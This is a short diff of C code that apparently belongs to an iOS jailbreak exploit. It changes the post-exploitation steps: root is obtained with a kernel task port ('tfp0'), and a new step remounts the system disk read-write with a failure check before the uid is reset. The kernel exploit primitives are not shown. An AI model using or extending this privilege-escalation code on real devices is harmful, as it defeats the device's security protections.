@@ -693,12 +693,19 @@ mach_port_t get_kernel_memory_rw() {
 void go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
   printf("tfp0: %x\n", tfp0);
-  uid_t olduid = get_root();
-    
+  uid_t olduid = get_root(tfp0);
    
     //lets try something useful
-    setPlatform();
-    //remountRW();
+    //setPlatform();
+    
+    //remount the disk to RW
+    int r = remountRW();
+    if (r == -1) {
+        printf("Fail.. bailing out!\n");
+        reset_root(olduid);
+        return;
+    }
+    	
     //we  panic if we don't reset the uid - this is probably KPP kicking in?
     reset_root(olduid);
     
